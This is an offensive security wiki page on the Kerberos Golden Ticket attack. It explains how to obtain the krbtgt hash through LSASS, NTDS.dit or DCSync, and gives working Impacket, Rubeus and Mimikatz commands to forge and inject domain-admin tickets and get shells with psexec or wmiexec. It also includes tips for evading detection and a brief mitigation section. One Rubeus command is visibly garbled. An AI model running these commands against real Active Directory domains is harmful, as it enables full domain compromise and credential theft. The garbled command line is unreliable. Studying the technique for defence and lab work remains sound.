# Golden Ticket

{{#include ../../banners/hacktricks-training.md}}

## Golden ticket

A **Golden Ticket** attack consist on the **creation of a legitimate Ticket Granting Ticket (TGT) impersonating any user** through the use of the **NTLM hash of the Active Directory (AD) krbtgt account**. This technique is particularly advantageous because it **enables access to any service or machine** within the domain as the impersonated user. It's crucial to remember that the **krbtgt account's credentials are never automatically updated**.

To **acquire the NTLM hash** of the krbtgt account, various methods can be employed. It can be extracted from the **Local Security Authority Subsystem Service (LSASS) process** or the **NT Directory Services (NTDS.dit) file** located on any Domain Controller (DC) within the domain. Furthermore, **executing a DCsync attack** is another strategy to obtain this NTLM hash, which can be performed using tools such as the **lsadump::dcsync module** in Mimikatz or the **secretsdump.py script** by Impacket. It's important to underscore that to undertake these operations, **domain admin privileges or a similar level of access is typically required**.

Although the NTLM hash serves as a viable method for this purpose, it is **strongly recommended** to **forge tickets using the Advanced Encryption Standard (AES) Kerberos keys (AES128 and AES256)** for operational security reasons.

```bash:From Linux
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```

```bash:From Windows
# Rubeus
## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
## The /printcmd option will print the complete command if later you want to generate a token offline
.\Rubeus.exe asktgt /user:Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd

 /rc4:25b2076cda3bfd6209161a6c78a69c1c /domain:jurassic.park /ptt
#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```

**Once** you have the **golden Ticket injected**, you can access the shared files **(C$)**, and execute services and WMI, so you could use **psexec** or **wmiexec** to obtain a shell (looks like yo can not get a shell via winrm).

### Bypassing common detections

The most frequent ways to detect a golden ticket are by **inspecting Kerberos traffic** on the wire. By default, Mimikatz **signs the TGT for 10 years**, which will stand out as anomalous in subsequent TGS requests made with it.

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

Use the `/startoffset`, `/endin` and `/renewmax` parameters to control the start offset, duration and the maximum renewals (all in minutes).

```
Get-DomainPolicy | select -expand KerberosPolicy
```

Unfortunately, the TGT's lifetime is not logged in 4769's, so you won't find this information in the Windows event logs. However, what you can correlate is **seeing 4769's without a prior 4768**. It's **not possible to request a TGS without a TGT**, and if there is no record of a TGT being issued, we can infer that it was forged offline.

In order to **bypass this detection** check the diamond tickets:

{{#ref}}
diamond-ticket.md
{{#endref}}

### Mitigation

- 4624: Account Logon
- 4672: Admin Logon
- `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

Other little tricks defenders can do is **alert on 4769's for sensitive users** such as the default domain administrator account.

## References

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets] (https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)

{{#include ../../banners/hacktricks-training.md}}



